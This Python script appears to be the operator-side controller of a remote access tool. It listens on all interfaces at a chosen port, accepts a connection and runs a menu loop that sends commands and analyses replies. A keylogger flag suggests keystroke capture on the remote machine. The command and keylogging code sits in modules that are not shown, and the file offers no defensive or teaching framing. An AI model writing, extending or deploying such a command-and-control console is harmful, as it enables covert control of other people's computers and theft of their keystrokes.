import colorama
import logging
import resource
import Menu
import Network
import tools
import mgArg


def echo_client(secure_communication, ip, log_file_name):
    is_keylogger_on = False

    print(resource.frame_menu)
    message = Menu.main_menu(secure_communication, ip,
                             log_file_name, is_keylogger_on)
    secure_communication.send_msg(message)

    while message != 'q':
        recv_msg = secure_communication.recv_msg()
        tools.analyse_recv_data(secure_communication, recv_msg)
        message = Menu.main_menu(secure_communication,
                                 ip, log_file_name, is_keylogger_on)
        secure_communication.send_msg(message)


def set_log(log_file_name, is_not_verbose):
    if is_not_verbose:
        level_log = logging.ERROR
    else:
        level_log = logging.DEBUG

    log_format = '[%(asctime)-15s] [%(levelname)s] %(message)s'
    logging.basicConfig(filename=log_file_name,
                        level=level_log, format=log_format)


def main():
    args = mgArg.mg_arg()
    set_log(args.logName, args.notverbose)
    colorama.init(autoreset=True)

    secure_communication = Network.SecureCommunication("0.0.0.0", args.LPORT)
    ip = secure_communication.secure_connect()
    if ip:
        echo_client(secure_communication, ip, args.logName)
        secure_communication.clean_socket()


if __name__ == "__main__":
    main()
